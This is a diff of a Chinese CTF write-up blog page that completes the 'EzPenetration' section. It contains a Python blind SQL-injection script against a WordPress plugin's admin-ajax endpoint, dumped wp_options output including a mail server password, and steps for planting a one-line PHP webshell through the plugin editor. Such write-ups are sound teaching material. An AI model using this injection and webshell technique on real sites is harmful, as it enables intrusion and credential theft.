@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#single-php%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">single_php（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realrce%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">realrce（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzPenetration%EF%BC%88%E5%92%95%E5%92%95%E5%92%95%EF%BC%89"><span class="toc-text">EzPenetration（咕咕咕）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezfastjson%EF%BC%88%E4%B8%8D%E4%BC%9A%EF%BC%89"><span class="toc-text">ezfastjson（不会）</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#single-php%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">single_php（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realrce%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">realrce（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-text">预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzPenetration%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-text">EzPenetration（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezfastjson%EF%BC%88%E4%B8%8D%E4%BC%9A%EF%BC%89"><span class="toc-text">ezfastjson（不会）</span></a></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">15.2k字</span>
+        <span class="post-count">15.5k字</span>
       </span>
     </span>
 
@@ -257,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">90分</span>
+        <span class="post-count">92分</span>
       </span>
     </span>
     
@@ -766,7 +766,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">&#
 
 <p>其它bypass：<code>env $&#39;cat&#39; /flag</code></p>
 <hr>
-<h2 id="EzPenetration（咕咕咕）"><a href="#EzPenetration（咕咕咕）" class="headerlink" title="EzPenetration（咕咕咕）"></a>EzPenetration（咕咕咕）</h2><blockquote>
+<h2 id="EzPenetration（复现）"><a href="#EzPenetration（复现）" class="headerlink" title="EzPenetration（复现）"></a>EzPenetration（复现）</h2><blockquote>
 <p>wordpress真实渗透</p>
 </blockquote>
 <p>进入题目，可以看到是个wordpress框架</p>
@@ -786,7 +786,7 @@ event_id=3%20UNION%20SELECT%200,1,2,3,4,5,6,7,8,group_concat(user_email)%20from%
 
 <p><img src="/blog/2023/11/25/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20231204225509563.png" alt="image-20231204225509563"></p>
 <p>测试回显，发现只会返回error和success，那么就写盲注脚本爆破数据库</p>
-<p>官方exp：</p>
+<p>exp：我这里直接dump了整个表的内容，嫌慢的在后面加个<code>where option_id = 16</code>一步到位得到password</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python</span>
 <span class="token keyword">import</span> requests
 
@@ -810,11 +810,11 @@ event_id=3%20UNION%20SELECT%200,1,2,3,4,5,6,7,8,group_concat(user_email)%20from%
         <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
             mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
             paramsPost <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-                <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"r3tr0young@gmail.com"</span><span class="token punctuation">,</span>
-                <span class="token string">"event_id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) from wp_options where option_id = 16)></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)-- "</span></span>
+                <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"recipient@example.com"</span><span class="token punctuation">,</span>
+                <span class="token string">"event_id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) from wp_options)></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)-- "</span></span>
             <span class="token punctuation">&#125;</span>
             cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"wordpress_test_cookie"</span><span class="token punctuation">:</span> <span class="token string">"WP%20Cookie%20check"</span><span class="token punctuation">&#125;</span>
-            response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://node4.buuoj.cn:29957/wp-admin/admin-ajax.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>paramsPost<span class="token punctuation">,</span> params<span class="token operator">=</span>paramsGet<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+            response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://node4.buuoj.cn:26313/wp-admin/admin-ajax.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>paramsPost<span class="token punctuation">,</span> params<span class="token operator">=</span>paramsGet<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
 
             <span class="token keyword">if</span> <span class="token string">"success"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                 head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
@@ -841,7 +841,54 @@ event_id=3%20UNION%20SELECT%200,1,2,3,4,5,6,7,8,group_concat(user_email)%20from%
     <span class="token keyword">except</span><span class="token punctuation">:</span>
         restart<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>咕咕咕</p>
+<p>爆破出的结果</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">siteurl~http://127.0.0.1:8080,
+home~http://127.0.0.1:8080,
+blogname~yanshu,
+blogdescription~WordPress,
+users_can_register~0,
+admin_email~y4nshu@163.com,
+start_of_week~1,
+use_balanceTags~0,
+use_smilies~1,
+require_name_email~1,
+comments_notify~1,
+posts_per_rss~10,
+rss_use_excerpt~0,
+mailserver_url~smtp.163.com,
+mailserver_login~y4nshu@163.com,
+mailserver_pass~fO0CO2#0ky#oLgH1JI,
+mailserver_port~465,
+default_category~1,
+default_comment_status~open,
+default_ping_status~open,
+default_pingback_flag~0,
+posts_per_page~10,
+date_format~Ynj,
+time_format~ag:i,
+links_updated_date_format~Ynjag:i,
+comment_moderation~0,
+moderation_notify~1,
+permalink_structure~,
+rewrite_rules~,
+hack_file~0,
+blog_charset~UTF-8,
+moderation_keys~,
+active_plugins~a:7:&#123;i:0;s:36:"contact-form-7/wp-contact-form-7.php";i:1;s:35:"contact-widgets/contact-widgets.php";i:2;s:25:"count-per-day/counter.php";i:3;s:39:"email-subscribers/email-subscribers.php";i:4;s:79:"registrations-for-the-events-calendar/registrations-for-the-events-cal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们只需要取<code>mailserver_login</code>和<code>mailserver_pass</code></p>
+<p>访问&#x2F;wp-admin&#x2F;，输入我们得到的帐密并登录</p>
+<p><img src="/blog/2023/11/25/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20231212000808158.png" alt="image-20231212000808158"></p>
+<p>然后在插件编辑器中修改插件的php代码</p>
+<p>注意这里要先关闭一个已启用的插件（第一个的Akismet访问会返回403，直接改已启用的插件会返回”无法与站点通信来检查致命错误，因此PHP修改已被回滚。您需要采用其他方式（如SFTP）上传您修改的PHP文件。“），我这里选择<code>Count Per Day</code></p>
+<p>然后选择count-per-day&#x2F;counter.php进行修改</p>
+<p><img src="/blog/2023/11/25/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20231212002800428.png" alt="image-20231212002800428"></p>
+<p>在里面插入个一句话木马，然后更新文件，接着在已安装的插件中启用Count Per Day</p>
+<p>然后再次启用插件</p>
+<p>接着访问<code>/wp-content/plugins/count-per-day/counter.php</code>getshell</p>
+<p><img src="/blog/2023/11/25/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20231212003403728.png" alt="image-20231212003403728"></p>
+<p><img src="/blog/2023/11/25/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20231212003438374.png" alt="image-20231212003438374"></p>
+<p>下班</p>
 <hr>
 <h2 id="ezfastjson（不会）"><a href="#ezfastjson（不会）" class="headerlink" title="ezfastjson（不会）"></a>ezfastjson（不会）</h2><p>不会java，等我哪天学成了再说</p>
 
